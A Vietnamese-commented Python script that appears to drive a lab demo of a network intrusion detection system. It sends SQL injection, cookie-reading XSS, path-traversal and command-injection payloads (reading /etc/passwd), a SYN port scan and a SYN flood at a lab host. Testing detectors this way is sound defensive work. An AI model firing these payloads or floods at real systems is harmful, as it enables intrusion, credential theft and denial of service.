"""
host_attacker_client.py - Công cụ phát động tấn công độc lập từ Máy 1 (Attacker)
Chạy trên Máy 1 (Laptop bạn của bạn: Windows/Linux/macOS) để tấn công Máy 2 (Victim + NIDS: 192.168.50.20:8080).
Không phụ thuộc Kali Linux, chỉ dùng Python chuẩn và Scapy.
"""
import sys
import time
import argparse
import urllib.request
import urllib.error

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
    except Exception:
        pass

try:
    from scapy.all import IP, TCP, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


DEFAULT_TARGET_IP = "192.168.50.20"
DEFAULT_TARGET_PORT = 8080


def test_connectivity(target_ip: str, target_port: int) -> bool:
    print(f"\n[*] Kiểm tra kết nối tới http://{target_ip}:{target_port}/ ...")
    try:
        url = f"http://{target_ip}:{target_port}/"
        req = urllib.request.Request(url, headers={"User-Agent": "NIDS-Tester/1.0"})
        with urllib.request.urlopen(req, timeout=3.0) as response:
            print(f"[+] Kết nối thành công! HTTP Status: {response.status}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[+] Máy 2 phản hồi mã HTTP {e.code} (Máy chủ web đang hoạt động bình thường).")
        return True
    except Exception as e:
        print(f"[-] Không thể kết nối tới http://{target_ip}:{target_port}/ ({e})")
        print("    Gợi ý: Kiểm tra cáp mạng, IP tĩnh 192.168.50.x, và đảm bảo đã tắt Windows Firewall trên Máy 2.")
        return False


def send_sqli(target_ip: str, target_port: int):
    print("\n[1/5] Đang gửi tấn công SQL INJECTION (UNION SELECT & Boolean)...")
    payloads = [
        f"/search.php?id=1'%20UNION%20SELECT%20username,password%20FROM%20users--",
        f"/login?user=admin'%20OR%20'1'='1&pass=123456"
    ]
    for p in payloads:
        url = f"http://{target_ip}:{target_port}{p}"
        print(f"  -> Gửi: {url}")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Attacker-SQLi/2.0"})
            urllib.request.urlopen(req, timeout=2.0)
        except Exception:
            pass
        time.sleep(0.5)


def send_xss(target_ip: str, target_port: int):
    print("\n[2/5] Đang gửi tấn công CROSS-SITE SCRIPTING (XSS)...")
    payloads = [
        f"/comment.php?msg=%3Cscript%3Ealert('Attacked_XSS')%3C/script%3E",
        f"/profile?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E"
    ]
    for p in payloads:
        url = f"http://{target_ip}:{target_port}{p}"
        print(f"  -> Gửi: {url}")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Attacker-XSS/1.0"})
            urllib.request.urlopen(req, timeout=2.0)
        except Exception:
            pass
        time.sleep(0.5)


def send_path_traversal(target_ip: str, target_port: int):
    print("\n[3/5] Đang gửi tấn công PATH TRAVERSAL (LFI)...")
    payloads = [
        f"/view?file=../../../../etc/passwd",
        f"/download?doc=..%2f..%2f..%2fwindows%2fwin.ini"
    ]
    for p in payloads:
        url = f"http://{target_ip}:{target_port}{p}"
        print(f"  -> Gửi: {url}")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Attacker-LFI/1.0"})
            urllib.request.urlopen(req, timeout=2.0)
        except Exception:
            pass
        time.sleep(0.5)


def send_command_injection(target_ip: str, target_port: int):
    print("\n[4/5] Đang gửi tấn công OS COMMAND INJECTION...")
    url = f"http://{target_ip}:{target_port}/api/exec"
    data = b"ip=127.0.0.1; cat /etc/passwd; whoami"
    print(f"  -> POST {url} | Body: {data.decode()}")
    try:
        req = urllib.request.Request(url, data=data, headers={"User-Agent": "Attacker-CmdI/1.0"})
        urllib.request.urlopen(req, timeout=2.0)
    except Exception:
        pass


def send_port_scan(target_ip: str, start_port: int = 8070, end_port: int = 8095):
    print(f"\n[5/5] Đang thực hiện TCP PORT SCAN tới {target_ip} (Cổng {start_port} -> {end_port})...")
    if not SCAPY_AVAILABLE:
        print("  [-] Chưa cài Scapy trên Máy 1. Dùng urllib để thăm dò các cổng web...")
        for p in range(start_port, end_port + 1):
            try:
                urllib.request.urlopen(f"http://{target_ip}:{p}/", timeout=0.1)
            except Exception:
                pass
            time.sleep(0.02)
        return

    for idx, port in enumerate(range(start_port, end_port + 1)):
        pkt = IP(dst=target_ip) / TCP(sport=50000 + idx, dport=port, flags="S", seq=100 + idx)
        send(pkt, verbose=False)
        time.sleep(0.02)
    print("  [+] Đã gửi 25 gói TCP SYN thăm dò tới 25 cổng khác nhau.")


def send_syn_flood(target_ip: str, target_port: int, count: int = 60):
    print(f"\n[*] Đang gửi {count} gói TCP SYN Flood tới {target_ip}:{target_port}...")
    if not SCAPY_AVAILABLE:
        print("  [-] Cần cài Scapy (pip install scapy) để gửi gói tin SYN Flood tầng 4.")
        return

    for i in range(count):
        pkt = IP(dst=target_ip) / TCP(sport=40000 + i, dport=target_port, flags="S", seq=1000 + i)
        send(pkt, verbose=False)
    print(f"  [+] Đã bơm hoàn tất {count} gói SYN Flood.")


def run_all_attacks(target_ip: str, target_port: int):
    print("=" * 65)
    print(f"   BẮT ĐẦU CHẠY KỊCH BẢN TẤN CÔNG DEMO: MÁY 1 ➔ MÁY 2 ({target_ip}:{target_port})   ")
    print("=" * 65)
    send_sqli(target_ip, target_port)
    send_xss(target_ip, target_port)
    send_path_traversal(target_ip, target_port)
    send_command_injection(target_ip, target_port)
    send_port_scan(target_ip)
    send_syn_flood(target_ip, target_port, count=60)
    print("\n" + "=" * 65)
    print("   [HOÀN TẤT] Mời quan sát cảnh báo trên Terminal & Web Dashboard của Máy 2!   ")
    print("=" * 65)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Host Attacker Client (Chạy trên Máy 1)")
    parser.add_argument("--ip", type=str, default=DEFAULT_TARGET_IP, help="Địa chỉ IP của Máy 2 (Victim/NIDS)")
    parser.add_argument("--port", type=int, default=DEFAULT_TARGET_PORT, help="Cổng dịch vụ Web của Máy 2 (Mặc định 8080)")
    parser.add_argument("--action", type=str, default="all",
                        choices=["all", "test", "sqli", "xss", "lfi", "cmdi", "scan", "flood"],
                        help="Loại hành động tấn công cần thực hiện")

    args = parser.parse_args()

    if args.action == "test":
        test_connectivity(args.ip, args.port)
    elif args.action == "sqli":
        send_sqli(args.ip, args.port)
    elif args.action == "xss":
        send_xss(args.ip, args.port)
    elif args.action == "lfi":
        send_path_traversal(args.ip, args.port)
    elif args.action == "cmdi":
        send_command_injection(args.ip, args.port)
    elif args.action == "scan":
        send_port_scan(args.ip)
    elif args.action == "flood":
        send_syn_flood(args.ip, args.port)
    else:
        run_all_attacks(args.ip, args.port)
